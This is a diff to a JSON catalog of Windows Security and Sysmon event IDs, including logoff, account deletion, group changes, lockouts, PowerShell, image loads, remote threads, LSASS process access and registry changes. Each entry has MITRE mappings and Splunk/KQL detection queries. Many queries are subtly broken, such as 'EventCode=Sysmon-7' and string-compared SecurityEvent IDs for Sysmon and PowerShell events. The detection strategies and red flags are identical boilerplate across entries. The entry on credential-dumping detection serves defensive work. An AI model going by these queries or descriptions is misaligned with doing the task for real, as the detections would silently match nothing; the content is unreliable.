+        "splunk": "index=windows EventCode=7045 | stats count by ServiceName, ImagePath",
+        "kql": "Event | where EventID == 7045 | parse RenderedDescription with * \"Service name: \" ServiceName"
+      },
+      "example": "Malware creates persistent service",
+      "relatedEvents": [
+        4697
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4634",
+      "name": "An Account was Logged Off",
+      "category": "Authentication",
+      "subcategory": "Logoff Events",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "An account was logged off.",
+      "detailedDescription": "An account was logged off.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account logged off",
+        "TargetDomainName - Account domain",
+        "LogonId - Logon session identifier"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor Event ID 4634 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4634 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4634",
+        "kql": "SecurityEvent | where EventID == \"4634\""
+      },
+      "example": "An account was logged off.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4647",
+      "name": "User Initiated Logoff",
+      "category": "Authentication",
+      "subcategory": "Logoff Events",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "User initiated logoff.",
+      "detailedDescription": "User initiated logoff.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User initiating logoff",
+        "TargetUserName - Account logged off",
+        "LogonId - Logon session identifier"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor Event ID 4647 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4647 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4647",
+        "kql": "SecurityEvent | where EventID == \"4647\""
+      },
+      "example": "User initiated logoff.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4726",
+      "name": "A User Account was Deleted",
+      "category": "Account Management",
+      "subcategory": "User Account Changes",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A user account was deleted.",
+      "detailedDescription": "A user account was deleted.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account deleted",
+        "SubjectUserName - Who deleted it",
+        "TargetSid - Deleted account SID"
+      ],
+      "mitre": [
+        "T1531"
+      ],
+      "mitreNames": [
+        "Account Access Removal"
+      ],
+      "detectionStrategy": "Monitor Event ID 4726 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4726 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4726",
+        "kql": "SecurityEvent | where EventID == \"4726\""
+      },
+      "example": "A user account was deleted.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4756",
+      "name": "A Member was Added to a Security-Enabled Universal Group",
+      "category": "Account Management",
+      "subcategory": "Group Membership",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A member was added to a security-enabled universal group.",
+      "detailedDescription": "A member was added to a security-enabled universal group.",
+      "logonTypes": null,
+      "keyFields": [
+        "MemberName - Member added",
+        "TargetUserName - Group receiving member",
+        "SubjectUserName - Who added the member"
+      ],
+      "mitre": [
+        "T1098"
+      ],
+      "mitreNames": [
+        "Account Manipulation"
+      ],
+      "detectionStrategy": "Monitor Event ID 4756 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4756 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4756",
+        "kql": "SecurityEvent | where EventID == \"4756\""
+      },
+      "example": "A member was added to a security-enabled universal group.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4740",
+      "name": "A User Account was Locked Out",
+      "category": "Account Management",
+      "subcategory": "User Account Changes",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A user account was locked out.",
+      "detailedDescription": "A user account was locked out.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account locked out",
+        "CallerComputerName - Source computer",
+        "SubjectUserName - Account initiating lockout"
+      ],
+      "mitre": [
+        "T1110"
+      ],
+      "mitreNames": [
+        "Brute Force"
+      ],
+      "detectionStrategy": "Monitor Event ID 4740 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4740 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4740",
+        "kql": "SecurityEvent | where EventID == \"4740\""
+      },
+      "example": "A user account was locked out.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "5145",
+      "name": "A Network Share Object was Checked",
+      "category": "Network",
+      "subcategory": "Network Share",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "Detailed check of network share object access permissions.",
+      "detailedDescription": "Detailed check of network share object access permissions.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User checking share",
+        "ShareName - Network share",
+        "RelativeTargetName - Object checked"
+      ],
+      "mitre": [
+        "T1021.002"
+      ],
+      "mitreNames": [
+        "SMB/Windows Admin Shares"
+      ],
+      "detectionStrategy": "Monitor Event ID 5145 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 5145 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=5145",
+        "kql": "SecurityEvent | where EventID == \"5145\""
+      },
+      "example": "Detailed check of network share object access permissions.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4105",
+      "name": "PowerShell Command Start",
+      "category": "Execution",
+      "subcategory": "PowerShell Logs",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "PowerShell command invocation started.",
+      "detailedDescription": "PowerShell command invocation started.",
+      "logonTypes": null,
+      "keyFields": [
+        "CommandName - Command name",
+        "CommandType - Command type",
+        "SequenceNumber - Invocation sequence"
+      ],
+      "mitre": [
+        "T1059.001"
+      ],
+      "mitreNames": [
+        "PowerShell"
+      ],
+      "detectionStrategy": "Monitor Event ID 4105 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4105 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4105",
+        "kql": "SecurityEvent | where EventID == \"4105\""
+      },
+      "example": "PowerShell command invocation started.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4106",
+      "name": "PowerShell Command Stop",
+      "category": "Execution",
+      "subcategory": "PowerShell Logs",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "PowerShell command invocation stopped.",
+      "detailedDescription": "PowerShell command invocation stopped.",
+      "logonTypes": null,
+      "keyFields": [
+        "CommandName - Command name",
+        "CommandType - Command type",
+        "SequenceNumber - Invocation sequence"
+      ],
+      "mitre": [
+        "T1059.001"
+      ],
+      "mitreNames": [
+        "PowerShell"
+      ],
+      "detectionStrategy": "Monitor Event ID 4106 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID 4106 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4106",
+        "kql": "SecurityEvent | where EventID == \"4106\""
+      },
+      "example": "PowerShell command invocation stopped.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "Sysmon-7",
+      "name": "Image Loaded",
+      "category": "Execution",
+      "subcategory": "Sysmon",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A module (DLL) was loaded by a process.",
+      "detailedDescription": "A module (DLL) was loaded by a process.",
+      "logonTypes": null,
+      "keyFields": [
+        "ImageLoaded - Module path",
+        "Image - Process image",
+        "ProcessId - Process identifier"
+      ],
+      "mitre": [
+        "T1055",
+        "T1574"
+      ],
+      "mitreNames": [
+        "Process Injection",
+        "Hijack Execution Flow"
+      ],
+      "detectionStrategy": "Monitor Event ID Sysmon-7 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID Sysmon-7 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=Sysmon-7",
+        "kql": "SecurityEvent | where EventID == \"Sysmon-7\""
+      },
+      "example": "A module (DLL) was loaded by a process.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "Sysmon-8",
+      "name": "CreateRemoteThread",
+      "category": "Execution",
+      "subcategory": "Sysmon",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A process created a thread in another process.",
+      "detailedDescription": "A process created a thread in another process.",
+      "logonTypes": null,
+      "keyFields": [
+        "SourceImage - Creating process",
+        "TargetImage - Target process",
+        "StartAddress - Remote thread start address"
+      ],
+      "mitre": [
+        "T1055"
+      ],
+      "mitreNames": [
+        "Process Injection"
+      ],
+      "detectionStrategy": "Monitor Event ID Sysmon-8 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID Sysmon-8 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=Sysmon-8",
+        "kql": "SecurityEvent | where EventID == \"Sysmon-8\""
+      },
+      "example": "A process created a thread in another process.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "Sysmon-10",
+      "name": "Process Access",
+      "category": "Credential Access",
+      "subcategory": "Sysmon",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A process opened a handle to another process (e.g. LSASS access).",
+      "detailedDescription": "A process opened a handle to another process (e.g. LSASS access).",
+      "logonTypes": null,
+      "keyFields": [
+        "SourceImage - Accessing process",
+        "TargetImage - Accessed process",
+        "GrantedAccess - Access rights"
+      ],
+      "mitre": [
+        "T1003"
+      ],
+      "mitreNames": [
+        "OS Credential Dumping"
+      ],
+      "detectionStrategy": "Monitor Event ID Sysmon-10 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID Sysmon-10 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=Sysmon-10",
+        "kql": "SecurityEvent | where EventID == \"Sysmon-10\""
+      },
+      "example": "A process opened a handle to another process (e.g. LSASS access).",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "Sysmon-12",
+      "name": "Registry Object Added or Deleted",
+      "category": "Persistence",
+      "subcategory": "Sysmon",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "Registry key created or deleted.",
+      "detailedDescription": "Registry key created or deleted.",
+      "logonTypes": null,
+      "keyFields": [
+        "EventType - Create or delete",
+        "TargetObject - Registry path",
+        "Image - Process image"
+      ],
+      "mitre": [
+        "T1547.001"
+      ],
+      "mitreNames": [
+        "Registry Run Keys / Startup Folder"
+      ],
+      "detectionStrategy": "Monitor Event ID Sysmon-12 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID Sysmon-12 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=Sysmon-12",
+        "kql": "SecurityEvent | where EventID == \"Sysmon-12\""
+      },
+      "example": "Registry key created or deleted.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "Sysmon-13",
+      "name": "Registry Value Set",
+      "category": "Persistence",
+      "subcategory": "Sysmon",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A registry value was set.",
+      "detailedDescription": "A registry value was set.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetObject - Registry value path",
+        "Details - New value",
+        "Image - Process image"
+      ],
+      "mitre": [
+        "T1547.001"
+      ],
+      "mitreNames": [
+        "Registry Run Keys / Startup Folder"
+      ],
+      "detectionStrategy": "Monitor Event ID Sysmon-13 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID Sysmon-13 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=Sysmon-13",
+        "kql": "SecurityEvent | where EventID == \"Sysmon-13\""
+      },
+      "example": "A registry value was set.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "Sysmon-14",
+      "name": "Registry Object Renamed",
+      "category": "Persistence",
+      "subcategory": "Sysmon",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "Registry key or value renamed.",
+      "detailedDescription": "Registry key or value renamed.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetObject - New registry path",
+        "EventType - Rename operation",
+        "Image - Process image"
+      ],
+      "mitre": [
+        "T1547.001"
+      ],
+      "mitreNames": [
+        "Registry Run Keys / Startup Folder"
+      ],
+      "detectionStrategy": "Monitor Event ID Sysmon-14 and correlate with related authentication, account, process, and network activity.",
+      "falsePositives": [
+        "Legitimate administrative activity",
+        "Normal system operations"
+      ],
+      "redFlags": [
+        "Suspicious or unexpected Event ID Sysmon-14 activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=Sysmon-14",
+        "kql": "SecurityEvent | where EventID == \"Sysmon-14\""
+      },
+      "example": "Registry key or value renamed.",
+      "relatedEvents": [],
+      "difficulty": "Intermediate"
+    }
+
+  ]
+}
